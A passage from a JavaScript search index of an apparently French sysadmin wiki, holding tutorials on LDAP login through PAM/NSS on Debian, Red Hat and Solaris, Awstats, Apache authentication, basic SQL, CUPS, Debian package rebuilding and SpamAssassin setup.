via PAM and NSS. So you just have to install and configure these components on the different systems.\nDebian linkYou have the choice of installing libpam-ldapd or libpam-ldap. libpam-ldapd is newer and avoids some bugs seen in libpam-ldap. It’s up to you to decide what you want :)\nlibpam-ldapd linkIf you opt for libnss-ldapd, then you simply need to install this and answer the questions.\naptitude install libnss-ldapd libpam-ldap linkIf you have chosen to install libpam-ldap instead of libpam-ldapd, you will need to do this manually.\nBy default, debian creates two different configuration files for libpam-ldap and libnss-ldap. This is unnecessary since these two files will contain the same thing. You need to delete the libpam-ldap configuration files and create links from those of libnss-ldap to those of libpam-ldap:\nrm /etc/pam_ldap.* ln -s /etc/libnss-ldap.conf /etc/pam_ldap.conf ln -s /etc/libnss-ldap.secret /etc/pam_ldap.secret Edit /etc/libnss-ldap.conf and put in it (it should only contain these lines):\nuri ldap://ldap.mydomain.local/ base dc=openldap,dc=mydomain,dc=local ldap_version 3 rootbinddn cn=admin,dc=openldap,dc=mydomain,dc=local scope sub nss_paged_results yes pagesize 1000 nss_base_passwd dc=openldap,dc=mydomain,dc=local?sub?\u0026(\u0026(objectClass=posixAccount)(!(objectClass=computer))) nss_base_shadow dc=openldap,dc=mydomain,dc=local?sub In /etc/libnss-ldap.secret, indicate the password of the user indicated on the rootdn line of the file /etc/libnss-ldap.conf.\nYou must then modify the file /etc/nsswitch.conf to indicate that the search will be done among others in the LDAP directory for the different services. This gives for example:\npasswd: files ldap group: files ldap shadow: files ldap hosts: files dns networks: files protocols: db files services: db files ethers: db files rpc: db files netgroup: nis libpam-ldapd and libpam-ldap linkFinally, you need to modify the PAM chains so that they allow authentication via the LDAP directory. This is done by copying the different files /etc/pam.d/common-* to /etc/pam.d/common-*-ldap:\ncd /etc/pam.d cp common-account{,-ldap} cp common-auth{,-ldap} cp common-pammount{,-ldap} cp common-password{,-ldap} cp common-session{,-ldap} Edit the different files /etc/pam.d/common-*-ldap to have:\n/etc/pam.d/common-account-ldap: account sufficient pam_ldap.so account sufficient pam_unix.so use_first_pass account required pam_deny.so /etc/pam.d/common-auth-ldap auth required pam_nologin.so auth sufficient pam_unix.so nullok_secure auth optional pam_mount.so debug use_first_pass auth optional pam_smbpass.so migrate use_first_pass auth sufficient pam_ldap.so use_first_pass auth required pam_deny.so /etc/pam.d/common-password-ldap password required pam_smbpass.so migrate password sufficient pam_ldap.so try_first_pass password sufficient pam_unix.so try_first_pass nullok obscure min=4 max=8 md5 password required pam_deny.so /etc/pam.d/common-session-ldap session required pam_unix.so session required pam_ldap.so session required pam_mkhomedir.so skel=/etc/skel/ umask=0022 session optional pam_mount.so /etc/pam.d/common-session session required pam_mkhomedir.so skel=/etc/skel/ umask=0022 session sufficient pam_ldap.so session required pam_unix.so Once these common-*-ldap files are created, you can edit the files of the different services for which you want to authorize authentication by LDAP… If for example you want to allow users contained in the LDAP directory to connect via SSH to the machine, you edit the file /etc/pam.d/ssh and replace the common-qqc with common-qqc-ldap.\nFor automounting partitions according to the user, edit the file /etc/security/pam_mount.conf:\nvolume * cifs 192.168.0.30 \u0026$ /media/windows/\u0026 sfu - - If you still cannot connect, restart the nscd service:\n/etc/init.d/nscd restart The following command should work correctly:\ngetent passwd mon_user Authorize a particular LDAP group linkOne common method is to only authorize one or certain LDAP groups to access a machine. For this, the groups must have the posixGroup attribute named login.\nDebian linkInstall libpam-modules if not already done:\naptitude install libpam-modules Then add this line to the file /etc/pam.d/common-auth:\n... auth required pam_access.so Red Hat linkInstall this package:\nyum install pam-devel And add this line to the service you want (sshd for example), the restriction:\nauth include password-auth account required pam_access.so account required pam_nologin.so Configuration linkThis will allow us to use the file /etc/security/access.conf. And here’s the kind of line that needs to be added:\n... # disallow all except people in the login group and root -:ALL EXCEPT root (sysadmin):ALL EXCEPT LOCAL This allows disabling all accounts except:\nroot The sysadmin group (not the user thanks to parentheses) LOCAL: local users Red Hat linkThere are 2 methods. The first uses a Red Hat script that will do everything for us, while the second is the manual solution.\nMethod 1 linkTo configure PAM with LDAP, use this command and adapt it to your needs:\nauthconfig --enableldap --enableldapauth --ldapserver=ldap://openldap-server.deimos.fr:389 --ldapbasedn=\"dc=openldap,dc=deimos,dc=fr\" --enableldaptls --ldaploadcacer=http://serveur-web/deimosfr.crt --enablemkhomedir --update –ldapserver: enter the address of your web server –ldapbasedn: your server’s DN –enableldaptls: if you use secure LDAP connections –ldaploadcacer: the certificate to use (if you don’t have a way to retrieve it this way, look at the procedure a bit below) Or a version without ssl/tls:\nauthconfig --enableldap --enableldapauth --disablenis --disableshadow --enablecache --passalgo=sha512 --disableldaptls --disableldapstarttls --disablesssdauth --enablemkhomedir --enablepamaccess --enablecachecreds --enableforcelegacy --disablefingerprint --ldapserver=192.168.0.1 --ldapbasedn=dc=openldap,dc=deimos,dc=fr --updateall To retrieve the SSL certificate requested above, here is a solution:\n\u003e openssl s_client -connect openldap-server.deimos.fr:636 CONNECTED(00000003) depth=0 C = FR, ST = IDF, L = Paris, O = DEIMOS, CN = openldap-server.deimos.fr, emailAddress = xxx@mycompany.com verify error:num=18:self signed certificate verify return:1 depth=0 C = FR, ST = IDF, L = Paris, O = DEIMOS, CN = openldap-server.deimos.fr, emailAddress = xxx@mycompany.com verify return:1 --- Certificate chain 0 s:/C=FR/ST=IDF/L=Paris/O=DEIMOS/CN=openldap-server.deimos.fr/emailAddress=xxx@mycompany.com i:/C=FR/ST=IDF/L=Paris/O=DEIMOS/CN=openldap-server.deimos.fr/emailAddress=xxx@mycompany.com --- Server certificate -----BEGIN CERTIFICATE----- MIIDpTCCAw6gAwIBAgIJAJJUJLhNM1/XMA0GCSqGSIb3DQEBBQUAMIGUMQswCQYD VQQGEwJGUjEMMAoGA1UECBMDSURGMQ4wDAYDVQQHEwVQYXJpczEPMA0GA1UEChMG VUxMSU5LMREwDwYDVQQLEwh1bHN5c25ldDEcMBoGA1UEAxMTdGFzbWFuaWEMdWxs aW5rLmxhbjElMCMGCSqGSIb3DQEJARYWaW503XJuYWwtaXRAdWxsaW5rLmNvbTAe Fw0xMTEyMDUxMjQzMzVaFw0yMTEyMDIxMjQzMzVaMIGUMQswCQYDVQQGEwJGUjEM MAoGA1UECBMDSURGMR4wDAYDVQQHEwVQYXJpczEPMA0GA1UEChMGVUxMSU5LMREw DwYDVQQLEwh1bHN5c25ldDEcMBoGA1UEAxMTdGFzbWFuaWEudWxsaW5rLmxhbjEl MCMGCSqGSIb3DQEJARYWaW50ZXJuYWwtaXRAdWxsaW5rLmNvbTCBnzANBgkqhkiG 9w0BAQEFAAOBjQAwgYkCgYEA4QoXFn39LhMW7mlA9r3NOX6iTHCCSlZjVQi0mQ5k BVysN8KMFfC0E4vOeG1Z11AYwW7xCOb4Pl+LgfgfdgfgfdJIn92LX0meJcsgWKOh qVAsZNkWn2ss8oDw3t5NEOjKFZ5BKVR2fL4Yj23DmFOAwew5PR5xhxGV5LJ9VErS Ks0CAwEAAaOB/DCB+TAdBgNVHQ4EFgQUn5Ig2hFtROXcG3vxux7izNqcUd4wgckG A1UdIwSBwTCBvoAUn5Ig2hFtROXcG3vxux7izNqcUd6hgZqkgZcwgZQxCzAJBgNV BAYTAkZSMQwwCgYDVQQIEwNJREYxDjAMBgNVBAcTBVBhcmlzMQ8wDQYDVQQKEwZV TExJTksxETAPBgNVBAsTCHVsc3lzbmV0MRwwGgYDVQQDExN0YXNtYW5pYS51bGxp bmsubGFuMSUwIwYJKoZIhvcNAQkBFhZpbnRlcm5hbC1pdEB1bGxpbmsuY29tggkA klQkuE0zX9cwDAYCVR0TBAUwAwEB/zANBgkqhkiG9w0BAQUFAAOBgQAbjjAbcBez dKyq+Tlf3/DURW0BJhHKyY7UW7L39m/KZRIB2lbgFjslrAL4yNnFgipJ6aKlJFfV BYEu7MhKH2pJZBYFpzuHOdKvDq+Kmn/wGvxeOvzh1GzQPGhQv4cClm2PJNMh/jrK ZWNzqyLWYtWAoLu6N6gMER1Bd1Z5uzHl3A== -----END CERTIFICATE----- subject=/C=FR/ST=IDF/L=Paris/O=DEIMOS/CN=openldap-server.deimos.fr/emailAddress=xxx@mycompany.com issuer=/C=FR/ST=IDF/L=Paris/O=DEIMOS/CN=openldap-server.deimos.fr/emailAddress=xxx@mycompany.com --- No client certificate CA names sent --- SSL handshake has read 1291 bytes and written 311 bytes --- New, TLSv1/SSLv3, Cipher is AES256-SHA Server public key is 1024 bit Secure Renegotiation IS NOT supported Compression: NONE Expansion: NONE SSL-Session: Protocol : TLSv1 Cipher : AES256-SHA Session-ID: 91E6398F6DE9FBDC1B7EBDF890FE818B09EB79555C9FC1CF64EDC284F7A23B2A Session-ID-ctx: Master-Key: 51408932336792F4E8F5339BD12F312005022A4B20E6A5FBC56239BC0DD514344449531973B9A8395B1E799196D8F411 Key-Arg : None Krb5 Principal: None PSK identity: None PSK identity hint: None Start Time: 1327491823 Timeout : 300 (sec) Verify return code: 18 (self signed certificate) --- In case the certificate is retrieved manually, copy it to /etc/openldap/cacerts/ldap.crt, then execute the following command:\ncacertdir_rehash /etc/openldap/cacerts Method 2 linkModify /etc/ldap.conf. This file is the equivalent of /etc/libnss_pam.conf on debian. You can therefore put the same thing in it.\nModify the file /etc/pam.d/system_auth: it’s the equivalent of the different common-* under debian. This gives for example:\nauth required /lib/security/$ISA/pam_env.so auth sufficient /lib/security/$ISA/pam_unix.so likeauth nullok auth sufficient /lib/security/$ISA/pam_ldap.so use_first_pass auth required /lib/security/$ISA/pam_deny.so account sufficient /lib/security/$ISA/pam_unix.so account sufficient /lib/security/$ISA/pam_ldap.so account sufficient /lib/security/$ISA/pam_succeed_if.so uid \u003c 100 quiet account required /lib/security/$ISA/pam_permit.so password requisite /lib/security/$ISA/pam_cracklib.so retry=3 password sufficient /lib/security/$ISA/pam_unix.so nullok use_authtok md5 shadow password required /lib/security/$ISA/pam_deny.so session optional /lib/security/$ISA/pam_mkhomedir.so skel=/etc/skel/ umask=0077 session required /lib/security/$ISA/pam_limits.so session required /lib/security/$ISA/pam_unix.so As on debian, you must also modify the file /etc/nsswitch.conf.\nForce a shell at login linkIf you have PAM authentication via LDAP, it is possible to force a particular shell at login. It will override the information sent by NSS and replace it with the desired shell. We will use lshell here for all people connecting via LDAP:\nnss_override_attribute_value loginShell /usr/bin/lshell Solaris link Configure the file /etc/pam.conf: For each line:\nservice auth required pam_unix_auth.so.1 replace “required” with “sufficient” and add behind the line:\nservice auth sufficient pam_ldap.so.1 try_first_pass Which should give something like this:\n# #ident \"@(#)pam.conf 1.28 04/04/21 SMI\" # # Copyright 2004 Sun Microsystems, Inc. All rights reserved. # Use is subject to license terms. # # PAM configuration # # Unless explicitly defined, all services use the modules # defined in the \"other\" section. # # Modules are defined with relative pathnames, i.e., they are # relative to /usr/lib/security/$ISA. Absolute path names, as # present in this file in previous releases are still acceptable. # # Authentication management # # login service (explicit because of pam_dial_auth) # login auth requisite pam_authtok_get.so.1 login auth required pam_dhkeys.so.1 login auth required pam_unix_cred.so.1 login auth sufficient pam_ldap.so.1 try_first_pass login auth sufficient pam_unix_auth.so.1 login auth required pam_dial_auth.so.1 # # rlogin service (explicit because of pam_rhost_auth) # rlogin auth sufficient pam_rhosts_auth.so.1 rlogin auth requisite pam_authtok_get.so.1 rlogin auth required pam_dhkeys.so.1 rlogin auth required pam_unix_cred.so.1 rlogin auth sufficient pam_ldap.so.1 try_first_pass rlogin auth sufficient pam_unix_auth.so.1 # # Kerberized rlogin service # krlogin auth required pam_unix_cred.so.1 krlogin auth binding pam_krb5.so.1 krlogin auth sufficient pam_ldap.so.1 krlogin auth sufficient pam_unix_auth.so.1 # # rsh service (explicit because of pam_rhost_auth, # and pam_unix_auth for meaningful pam_setcred) # rsh auth sufficient pam_rhosts_auth.so.1 rsh auth required pam_unix_cred.so.1 # # Kerberized rsh service # krsh auth required pam_unix_cred.so.1 krsh auth binding pam_krb5.so.1 krsh auth sufficient pam_ldap.so.1 krsh auth sufficient pam_unix_auth.so.1 # # Kerberized telnet service # ktelnet auth required pam_unix_cred.so.1 ktelnet auth binding pam_krb5.so.1 ktelnet auth sufficient pam_ldap.so.1 ktelnet auth sufficient pam_unix_auth.so.1 # # PPP service (explicit because of pam_dial_auth) # ppp auth requisite pam_authtok_get.so.1 ppp auth required pam_dhkeys.so.1 ppp auth required pam_unix_cred.so.1 ppp auth sufficient pam_ldap.so.1 ppp auth sufficient pam_unix_auth.so.1 ppp auth required pam_dial_auth.so.1 # # Default definitions for Authentication management # Used when service name is not explicitly mentioned for authentication # other auth requisite pam_authtok_get.so.1 other auth required pam_dhkeys.so.1 other auth required pam_unix_cred.so.1 other auth sufficient pam_ldap.so.1 other auth sufficient pam_unix_auth.so.1 # # passwd command (explicit because of a different authentication module) # passwd auth required pam_passwd_auth.so.1 # # cron service (explicit because of non-usage of pam_roles.so.1) # cron account required pam_unix_account.so.1 # # Default definition for Account management # Used when service name is not explicitly mentioned for account management # other account requisite pam_roles.so.1 other account required pam_unix_account.so.1 # # Default definition for Session management # Used when service name is not explicitly mentioned for session management # other session required pam_unix_session.so.1 # # Default definition for Password management # Used when service name is not explicitly mentioned for password management # other password required pam_dhkeys.so.1 other password requisite pam_authtok_get.so.1 other password requisite pam_authtok_check.so.1 other password required pam_authtok_store.so.1 # # Support for Kerberos V5 authentication and example configurations can # be found in the pam_krb5(5) man page under the \"EXAMPLES\" section. # Configure the file /etc/nsswitch.ldap Leave “ldap” only where it’s useful: for now on the passwd: and group: lines.\nFor the rest, put the content of the file /etc/nsswitch.dns.\nWhich gives:\n# # Copyright 2006 Sun Microsystems, Inc. All rights reserved. # Use is subject to license terms. # # # /etc/nsswitch.dns: # # An example file that could be copied over to /etc/nsswitch.conf; it uses # DNS for hosts lookups, otherwise it does not use any other naming service. # # \"hosts:\" and \"services:\" in this file are used only if the # /etc/netconfig file has a \"-\" for nametoaddr_libs of \"inet\" transports. # DNS service expects that an instance of svc:/network/dns/client be # enabled and online. passwd: files ldap group: files ldap # You must also set up the /etc/resolv.conf file for DNS name # server lookup. See resolv.conf(4). hosts: files dns # Note that IPv4 addresses are searched for in all of the ipnodes databases # before searching the hosts databases. ipnodes: files dns networks: files protocols: files rpc: files ethers: files netmasks: files bootparams: files publickey: files # At present there isn't a 'files' backend for netgroup; the system will # figure it out pretty quickly, and won't use netgroups at all. netgroup: files automount: files aliases: files services: files printers: user files auth_attr: files prof_attr: files project: files tnrhtp: files tnrhdb: files Once that is done, we will be able to set up the configuration. Warning: if you are in a cluster environment, adapt to the initial configuration!:\ncp /etc/nsswitch.ldap /etc/nsswitch.conf Launch the LDAP client configuration Just type the command:\nldapclient manual -v -a authenticationMethod=simple -a proxyDN=cn=admin,dc=openldap,dc=mydomain,dc=local -aproxyPassword=bidon -a defaultSearchBase=dc=openldap,dc=mydomain,dc=local -a defaultServerList=ldap.mydomain.local -a serviceSearchDescriptor=passwd:dc=openldap,dc=mydomain,dc=local?sub -a serviceSearchDescriptor=shadow:dc=openldap,dc=mydomain,dc=local?sub -a serviceSearchDescriptor=group:dc=openldap,dc=mydomain,dc=local?sub -a serviceAuthenticationMethod=pam_ldap:simple= Attention: it seems that the ldapclient command is buggy and requires the proxyDN and proxyPassword parameters even if they are unused! (and even if they contain anything).\nPay attention to the home directory, you must configure /etc/auto_home (http://www.solaris-fr.org/home/docs/base/utilisateurs). For my part, this gives: # # Copyright 2003 Sun Microsystems, Inc. All rights reserved. # Use is subject to license terms. # # ident \"@(#)auto_home 1.6 03/04/28 SMI\" # # Home directory map for automounter # +auto_home * localhost:/export/home/\u0026 In case you want to automatically create the home directory, you must port the pam_mkhomedir from Linux:\nhttp://mega.ist.utl.pt/~filipe/pam_mkhomedir-sol/?C=D;O=A http://www.keutel.de/pam_mkhomedir/index.html A good idea would also be to automatically mount the home from an NFS server.\nUser accounts in the LDAP directory must have in their objectClass list the class “shadowAccount” to be taken into account by Solaris.\nResources linkAuthentication with Linux Documentation\nUsing Kerberos to Authenticate a Solaris 10 OS LDAP Client With Microsoft Active Directory\n"
            }
        );
    index.add(
            {
                id:  441 ,
                href: "\/Awstats_:_Mise_en_place_d%27Awstats,_interpr%C3%A9teur_de_logs_web\/",
                title: "Awstats: Setting up Awstats, a Web Logs Interpreter",
                description: "Learn how to install and configure Awstats, a powerful web log analyzer that provides graphical reports on website traffic statistics.",
                content: "Introduction linkAWStats is a web log analyzer (but also FTP, Streaming, and mail) offering static but also dynamic graphical views of access statistics for your web servers.\nIt displays the number of visits, unique visitors, pages, hits, transfers by domain/country, host, time, browser, OS, etc. It can be run using CGI scripts or command line.\nAWStats is free software under the GPL license.\nThe installation of Awstats is simple: this software interprets Apache logs (all commands to which the server responded) to provide you with understandable graphs and tables in the form of a web page.\nInstallation linkInstall Awstats using the command:\naptitude install awstats Configuration linkApache linkIn the configuration, I’m modifying these lines if I’m using Apache:\nLogFile=\"/var/log/apache2/access.log\" SiteDomain=\"deimos.fr\" Displaying the web page interpreting logs will require images: you have two solutions so that the address http://your_address/awstats-icon directs to awstats images: use an Apache alias or create an awstats-icon folder in your Apache space and put the awstats images there. For this last solution, type:\nmkdir /var/www/awstats-icon cp -r /usr/share/awstats/icon/* /var/www/awstats-icon Lighttpd linkUse this configuration if you’re using Lighttpd:\nLogFile=\"/var/log/lighttpd/access.log\" SiteDomain=\"deimos.fr\" LogFormat=1 We’ll also need to configure lighttpd:\nalias.url = ( \"/awstats-icon\" =\u003e \"/usr/share/awstats/icon/\", \"/awstats/\" =\u003e \"/usr/lib/cgi-bin/\", \"/icon/\" =\u003e \"/usr/share/awstats/icon/\" ) # provide awstats cgi-bin access $HTTP[\"url\"] =~ \"/awstats/\" { cgi.assign = ( \".pl\" =\u003e \"/usr/bin/perl\" ) } Then we’ll activate this configuration:\ncd /etc/lighttpd/conf-enabled \u0026\u0026 ln -s /etc/lighttpd/conf-available/50-awstats.conf . Crontab and Multi-domains linkBy default, there is a line in the crontab that does its job well. But if you have multiple domains and therefore several configuration files in /etc/awstats/, you’ll need to be a bit tricky. I recommend commenting out the current line in this cron file:\n#0,10,20,30,40,50 * * * * www-data [ -x /usr/lib/cgi-bin/awstats.pl -a -f /etc/awstats/awstats.conf -a -r /var/log/apache/access.log ] \u0026\u0026 /usr/lib/cgi-bin/awstats.pl -config=awstats -update \u003e/dev/null And either add lines like:\n0,10,20,30,40,50 * * * * www-data /usr/lib/cgi-bin/awstats.pl -config=deimos.fr 0,10,20,30,40,50 * * * * www-data /usr/lib/cgi-bin/awstats.pl -config=mavro.fr To differentiate your domains (here deimos.fr and mavro.fr), or create a small script like this and put it in the cron instead:\n#!/bin/bash # path to cgi-bin AWS=/usr/lib/cgi-bin/awstats.pl # append your domain DOMAINS=\"deimos.fr mavro.fr\" # loop through all domains for d in ${DOMAINS} do ${AWS} -update -config=${d} done A small chmod for execution rights and you’re good to go.\nProtection of Awstats linkYou probably don’t want your statistics to be accessible from anywhere, so you can protect yourself with htaccess or something else.\nhtaccess under Apache linkThis documentation explains how to protect a directory with htaccess (login + password).\nInsert these lines and adapt to your configuration (/etc/apache2/sites-enabled/000-default):\nAllowOverride AuthConfig Order allow,deny allow from all Then create a .htaccess file in /var/www/myhtaccess and add this:\nAuthType Basic AuthName \"Acces Prive\" AuthGroupFile /dev/null AuthUserFile /etc/apache2/htaccesspassword Require valid-user php_value magic_quotes_runtime 1 php_value magic_quotes_gpc 1 Then create your access file with the user (/etc/apache2/htaccesspassword):\nhtpasswd -c /etc/apache2/htaccesspassword username For the next time, to add users, just remove “-c” like this:\nhtpasswd /etc/apache2/htaccesspassword username Don’t forget to restart apache :-)\nFor good documentation, follow this: Documentation on Htaccess\nhtdigest under Lighttpd linkHtaccess files don’t exist in Lighttpd, but there is an equivalent. Check before starting that the mod_auth module is properly loaded. We’ll first generate (with -c for the first time, like htaccess) a file containing the credentials to be authorized to view a specific site:\nhtdigest -c /etc/lighttpd/.passwd 'Authorized users only' deimos Here I’m creating the user deimos. The realm (here ‘Authorized users only’) will allow us to differentiate between different login/password files that we can have since we can only specify one for the entire server.\nThen add these lines to the global lighttpd configuration:\nauth.backend = \"htdigest\" auth.backend.htdigest.userfile = \"/etc/lighttpd/.passwd\" auth.debug = 2 Then I add the protection where I need it:\nauth.require = ( \"/docs/\" =\u003e ( \"method\" =\u003e \"digest\", \"realm\" =\u003e \"Authorized users only\", \"require\" =\u003e \"valid-user\" ) ) Restart lighty and you’re good. The example above shows how to add the restriction where we need it, so we’ll do it by modifying our awstats configuration:\nalias.url = ( \"/awstats-icon\" =\u003e \"/usr/share/awstats/icon/\", \"/awstats/\" =\u003e \"/usr/lib/cgi-bin/\", \"/icon/\" =\u003e \"/usr/share/awstats/icon/\" ) # provide awstats cgi-bin access $HTTP[\"url\"] =~ \"/awstats/\" { cgi.assign = ( \".pl\" =\u003e \"/usr/bin/perl\" ) auth.require = ( \"/awstats/\" =\u003e ( \"method\" =\u003e \"digest\", \"realm\" =\u003e \"Trusted users only\", \"require\" =\u003e \"valid-user\" ) ) } "
            }
        );
    index.add(
            {
                id:  442 ,
                href: "\/Mixing_Apache_Authentication\/",
                title: "Mixing Apache Authentication",
                description: "How to mix different authentication methods in Apache including PAM, htaccess, IP restrictions, country-based access, and Radius authentication.",
                content: "Mixing PAM linkLinux linkHow to mix PAM authentication (mod_auth_pam) and text file authentication (mod_auth) with Apache. First install this package:\napt-get install libapache2-mod-auth-pam Then configure your htaccess:\nAuthPAM_Enabled on AuthPAM_FallThrough on AuthAuthoritative Off AuthUserFile /etc/apache2/htpassword AuthType Basic AuthName \"Restricted Access\" Require valid-user If mod_auth_pam doesn’t find a valid user, it falls back to mod_auth authentication automatically.\nHere is another example with webdav:\nAlias /webdav /var/www/ngs DAV On AuthPAM_Enabled on AuthBasicAuthoritative Off AuthPAM_FallThrough off AuthUserFile /dev/null AuthType Basic AuthName \"Webdav Authentication\" Require group ngs OpenBSD linkOn OpenBSD, I had to install mod_auth_bsd:\npkg_add -iv mod_auth_bsd Then, enable the module for Apache:\n/usr/local/sbin/mod_auth_bsd-enable Then restart Apache this way:\napachectl stop apachectl start Then in the Apache configuration /var/www/conf/http.conf, add this:\nAuthBSDGroup auth SSLRequireSSL AuthType Basic AuthName \"ACME Login\" AuthBSD On Require valid-user Restriction by IP address linkImagine using Jinzora. You don’t want all your music to be accessible on the web. Simply add this to your VirtualHost configuration:\nvi /etc/apache2/sites-enabled/000-default@ Order deny,allow Deny from all Allow from 192.168.0.0/24 This will allow all the 192.168.0.0 subnet to access your website. Then reload Apache:\n/etc/init.d/apache2 reload Restriction by htaccess linkThis documentation is on how to protect a directory by htaccess (login + password).\nInsert these lines and adapt to your configuration (/etc/apache2/sites-enabled/000-default):\nAllowOverride AuthConfig Order allow,deny allow from all Then create a file .htaccess in /var/www/myhtaccess and put this:\nAuthType Basic AuthName \"Acces Prive\" AuthGroupFile /dev/null AuthUserFile /etc/apache2/htaccesspassword Require valid-user php_value magic_quotes_runtime 1 php_value magic_quotes_gpc 1 Then create your access file with the user (/etc/apache2/htaccesspassword):\nhtpasswd -c /etc/apache2/htaccesspassword username For the next time, to add users, just remove “-c” like this:\nhtpasswd /etc/apache2/htaccesspassword username Don’t forget to restart Apache.\nFor a good documentation, follow this: Documentation on Htaccess\nAuthentication by Countries linkDeny Or Allow Countries With Apache htaccess\nAuthentication through Radius linkHere is how to authenticate through a radius server:\nRadius Authentication\nHow To Configure Apache To Use Radius For Two-Factor Authentication On Ubuntu\n"
            }
        );
    index.add(
            {
                id:  443 ,
                href: "\/Introduction_au_SQL\/",
                title: "Introduction to SQL",
                description: "A comprehensive introduction to SQL, covering basic commands like CREATE, INSERT, UPDATE, DELETE and SELECT, as well as advanced topics like sorting, filtering and wildcards.",
                content: "Introduction linkStructured Query Language (SQL) is a standardized and normalized pseudo-language (query type), designed to query or manipulate a relational database with:\nA Data Definition Language (DDL) A Data Manipulation Language (DML), the most common and visible part of SQL A Data Control Language (DCL) A Transaction Control Language (TCL) And other modules designed to write routines (procedures, functions, or triggers) and interact with external languages. SQL is part of the same family as SEQUEL (of which it is a descendant), QUEL, or QBE (Zloof) languages.\nCreate - Data Insertion linkThe INSERT command adds a row to a database table:\nINSERT INTO TABLE (column1[, column2, column3, ...]) VALUES (value1[, value2, value3, ...]) The number of columns appearing in parentheses before VALUES must match the number of values in the parentheses after. To insert a row that contains values for only certain columns, simply indicate the relevant columns and their corresponding values:\nINSERT INTO dishes (dish_name, is_spicy) VALUES ('Salt Baked Scallops', 0) The column list can be omitted if you are inserting values for all columns in a row:\nINSERT INTO dishes VALUES (1, 'Braised Sea Cucumber', 6.50, 0) UPDATE - Data Update linkThe UPDATE command modifies data already present in a table:\nUPDATE tablename SET column1=value1[, column2=value2, column3=value3, ...] [WHERE where_clause] Here’s an example of initializing a column with a string or number:\n; CHANGE price TO 5.50 IN ALL ROWS OF the TABLE UPDATE dishes SET price = 5.50 ; CHANGE is_spicy TO 1 IN ALL ROWS OF the TABLE UPDATE dishes SET is_spicy = 1 Another example, using a column name in an UPDATE expression:\nUPDATE dishes SET price = price * 2 All UPDATE queries we have just presented modify each row in the dishes table. To have UPDATE change only certain rows, simply add a WHERE clause which is a logical expression that specifies which rows to modify (in this example). Here’s the use of a WHERE clause with UPDATE:\n; CHANGE the spicy STATUS OF Eggplant WITH Chili Sauce UPDATE dishes SET is_spicy = 1 WHERE dish_name = 'Eggplant with Chili Sauce' ; Decrease the price OF General Tso's Chicken UPDATE dishes SET price = price - 1 WHERE dish_name = 'General Tso\\'s Chicken' Another example: I wanted to replace words in MediaWiki (source by syntaxhighlight) for updating Geshi (Syntax Highlight), here are the commands I used:\nUPDATE `blocnotesinfo`.`wiki_text` SET `old_text` = REPLACE(`old_text`,\""
            }
        );
    index.add(
            {
                id:  444 ,
                href: "\/Cups_:_mise_en_place_d\u0027un_serveur_d\u0027impression\/",
                title: "CUPS: Setting Up a Print Server",
                description: "Guide on how to set up a CUPS print server on Linux systems, including installation, configuration, and administration.",
                content: "Introduction linkThe Common Unix Printing System (CUPS) is a modular printing system for Unix and Unix-like operating systems. Any computer using CUPS can act as a print server; it can accept documents sent from other machines (client computers), process them, and send them to the appropriate printer.\nInstallation linkThe installation is very simple:\naptitude install cupsys cupsys-client cupsys-bsd cupsys-driver-gimpprint samba-client I’ve included a module for creating PDFs and a package containing drivers.\nConfiguration linkParallel Ports linkThis technology is now almost obsolete, so it’s unlikely that you have a printer operating on a parallel port. If like me you don’t need it, disable this option:\n# Cups configure options # LOAD_LP_MODULE: enable/disable to load \"lp\" parallel printer driver module LOAD_LP_MODULE=no cupsd.conf linkNow, let’s edit the basic configuration and change it so that we can access it. Here are the lines to replace (in this case my server is 192.168.0.1 in a 192.168.0.0 network):\n... # Only listen for connections from the local machine. Listen 192.168.0.1:631 ... # Restrict access to the server... Order Deny,Allow Deny From All Allow From 192.168.0.* Allow From @LOCAL ... # Restrict access to the admin pages... AuthType Basic AuthClass System Order Deny,Allow Deny From All Allow From 192.168.0.* Allow From @LOCAL Restart the CUPS service afterward.\nYou can now access the administration interface via: http://192.168.0.1:631 or https://192.168.0.1:631\nAdministering Printers linkTo authorize a user account to administer printers, simply add it to the lpadmin group:\nadduser username lpadmin References linkCUPS Documentation\n"
            }
        );
    index.add(
            {
                id:  445 ,
                href: "\/Recompiler_un_soft_%C3%A0_la_sauce_Debian\/",
                title: "Recompile a Software the Debian Way",
                description: "Tutorial on how to recompile Debian packages while keeping the Debian package system benefits.",
                content: "Introduction linkSometimes you need to recompile some software. But when using Debian packages, it’s not always easy because you want to keep the Debian conveniences. The solution is apt-get source :-)\nInstallation linkWe will need these packages:\naptitude install dpkg-dev Example linkFor example, I want to install nginx but recompile it with an additional option. I download the sources as follows:\napt-get source nginx Then I have a directory containing the sources and I reconfigure my sources with ./configure.\nAfter that, all that’s left is to recreate the package:\ndpkg-buildpackage -us -uc You may be missing some packages that will be indicated afterwards (usually autotools-dev). Install them and restart the above line.\nThen install the package like this:\ndpkg -i nginx.deb "
            }
        );
    index.add(
            {
                id:  446 ,
                href: "\/Installation_et_configuration_de_SpamAssassin\/",
                title: "SpamAssassin Installation and Configuration",
                description: "A guide for installing and configuring SpamAssassin to filter spam emails, including adding Spam and Ham messages for training the system.",
                content: "Installation linkTo install SpamAssassin, it’s very simple:\napt-get install spamassassin libmail-spf-query-perl Configuration linkHere’s my configuration file that you can adapt to your needs (/etc/spamassassin/local.cf):\n# SpamAssassin Configuration rewrite_header Subject *****SPAM***** use_bayes 1 bayes_auto_learn 1 required_score 5.0 skip_rbl_checks 0 report_safe 0 #pyzor #use_pyzor 1 #pyzor_path /usr/bin/pyzor #razor #use_razor2 1 #razor_config /etc/razor/razor-agent.conf ok_locales en fr whitelist_from *@deimos.fr noreply@lists.silicon.fr blacklist_from *@mandrivaclub.com Now, we need to enable SpamAssassin to start automatically. For this, in the file /etc/default/spamassassin, change from:\nENABLED=0 to:\nENABLED=1 Then, restart SpamAssassin:\n/etc/init.d/spamassassin restart There is also a website that allows you to generate a SpamAssassin configuration.\nAdding Spam and Ham linkTo add Ham or Spam, we’ll insert this into the crontab of the person(s) who want to manage this:\nsa-learn --spam --dir ~/Maildir/.Spam/cur \u0026\u0026 mv ~/Maildir/.Spam/cur/* ~/Maildir/.Trash/cur/ sa-learn --ham --dir ~/Maildir/.NoSpam/cur \u0026\u0026 mv ~/Maildir/.NoSpam/cur/* ~/Maildir/cur/ Alternatively, a small script can also do the job (~/.antispam.sh):\n#!/bin/sh sa-learn --spam --dir ~/Maildir/.Spam/cur if [ `ls ~/Maildir/.Spam/cur/ | wc | awk '{ print $1 }'` != 0 ] ; then mv ~/Maildir/.Spam/cur/* ~/Maildir/.Trash/cur/ 2\u003e\u00261 /dev/null fi sa-learn --ham --dir ~/Maildir/.NoSpam/cur if 